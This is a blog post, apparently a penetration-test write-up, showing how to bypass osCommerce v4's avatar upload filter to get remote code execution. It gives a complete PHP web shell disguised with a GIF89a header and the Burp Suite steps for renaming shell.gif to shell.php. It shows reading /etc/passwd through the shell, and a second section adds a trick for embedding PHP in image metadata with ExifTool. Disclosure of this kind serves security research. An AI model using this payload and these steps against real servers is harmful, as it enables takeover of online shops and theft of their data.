[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Ff1ac0097880c&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fcupc4k3.medium.com%2Foscommerce-v4-rce-unveiling-the-file-upload-bypass-threat-f1ac0097880c&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fcupc4k3.medium.com%2Foscommerce-v4-rce-unveiling-the-file-upload-bypass-threat-f1ac0097880c&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# OsCommerce v4 RCE: Unveiling the File Upload Bypass Threat

[![CUPC4K3](https://miro.medium.com/v2/resize:fill:88:88/1*sikNx0qf7_UNyFkcoU5a6A.png)](/?source=post_page---byline--f1ac0097880c--------------------------------)

[CUPC4K3](/?source=post_page---byline--f1ac0097880c--------------------------------)

·

[Follow](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2Fb1982ea52cc8&operation=register&redirect=https%3A%2F%2Fcupc4k3.medium.com%2Foscommerce-v4-rce-unveiling-the-file-upload-bypass-threat-f1ac0097880c&user=CUPC4K3&userId=b1982ea52cc8&source=post_page-b1982ea52cc8--byline--f1ac0097880c---------------------post_header-----------)

4 min read·Nov 28, 2024

--

1

Listen

Share

![]()

In my recent penetration test, I identified a critical vulnerability in osCommerce v4, specifically a Remote Code Execution (RCE) vulnerability enabled by bypassing file upload restrictions.

This issue was discovered while editing the administrator’s profile picture. By changing the file extension from ‘shekk.gif’ to ‘shell.php’, as detailed in the request below, the application erroneously accepted the file with the altered extension.

![]()

I initiated the upload process of a malicious GIF file. This was done by clicking on ‘edit’ to upload the file.

![]()

The request was intercepted using Burp Suite, as illustrated in the image below. During this process, I altered the file extension from ‘shell.gif’ to ‘shell.php’. The content of this file included the following payload:

**GIF89a;
<?
system($\_GET[‘cmd’]);
?>**

The payload above is a simple yet effective PHP script designed to execute system commands from the GET request’s ‘cmd’ parameter. The initial ‘GIF89a;’ is a GIF file header, which tricks the server into treating this file as a benign image. This method is a classic example of bypassing upload filters by exploiting the server’s file handling logic, allowing for the execution of arbitrary commands.

![]()

After the upload, I noticed that the image appeared to be loaded, but the file extension remained as ‘shell.gif’.

![]()

However, upon clicking ‘Update’ and re-examining the request, I found the ‘avatar’ parameter containing the file ‘shell.gif’. By modifying this to ‘shell.php’, the upload was successfully executed, and the file was accepted by the application.

![]()![]()

By accessing the ‘shell.php’ file in its directory, I was able to successfully achieve Remote Code Execution (RCE). As an example, executing the command **‘cat /etc/passwd’** demonstrated the ability to run server commands and potentially access sensitive data.”

![]()

I’m going to share a neat trick on how to achieve Remote Code Execution (RCE) via metadata using the ExifTool. It’s a nifty little method that can yield some powerful results.

So, imagine you have an image file and you want to embed some PHP code into its metadata using ExifTool. Let’s say you insert the following code into the comment field: **<?php echo system(‘id’);?>.**
This code, when executed, will display the output of the id command, which gives information about the current user and their privileges.

![]()

Once you’ve inserted this PHP code into the metadata of your image file. Now, here’s where things get interesting. If the application doesn’t properly sanitize or filter the metadata of uploaded files, it might execute the PHP code embedded in the image’s metadata.

![]()![]()![]()

Now, let’s say we intercept the request using a tool like Burp Suite. We can then examine the response and see if our PHP code was executed successfully. If it was, we’ll be able to observe the output of the `id` command right there in the response, confirming that we've achieved Remote Code Execution.

![]()

So, there you have it — a sneaky little trick to achieve RCE via metadata using ExifTool. Happy hacking!

[Pentesting](https://medium.com/tag/pentesting?source=post_page-----f1ac0097880c--------------------------------)[Offensive Security](https://medium.com/tag/offensive-security?source=post_page-----f1ac0097880c--------------------------------)[Red Team](https://medium.com/tag/red-team?source=post_page-----f1ac0097880c--------------------------------)[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----f1ac0097880c--------------------------------)

--

--

1

[![CUPC4K3](https://miro.medium.com/v2/resize:fill:96:96/1*sikNx0qf7_UNyFkcoU5a6A.png)](/?source=post_page---post_author_info--f1ac0097880c--------------------------------)[![CUPC4K3](https://miro.medium.com/v2/resize:fill:128:128/1*sikNx0qf7_UNyFkcoU5a6A.png)](/?source=post_page---post_author_info--f1ac0097880c--------------------------------)Follow[## Written by CUPC4K3](/?source=post_page---post_author_info--f1ac0097880c--------------------------------)[243 Followers](/followers?source=post_page---post_author_info--f1ac0097880c--------------------------------)·[68 Following](/following?source=post_page---post_author_info--f1ac0097880c--------------------------------)

Offensive Security | Cyber Security | Security Researcher | Red Team | Pentest

Follow
## Responses (1)

See all responses[Help](https://help.medium.com/hc/en-us?source=post_page-----f1ac0097880c--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----f1ac0097880c--------------------------------)[About](https://medium.com/about?autoplay=1&source=post_page-----f1ac0097880c--------------------------------)[Careers](https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----f1ac0097880c--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----f1ac0097880c--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----f1ac0097880c--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----f1ac0097880c--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----f1ac0097880c--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----f1ac0097880c--------------------------------)[Teams](https://medium.com/business?source=post_page-----f1ac0097880c--------------------------------)

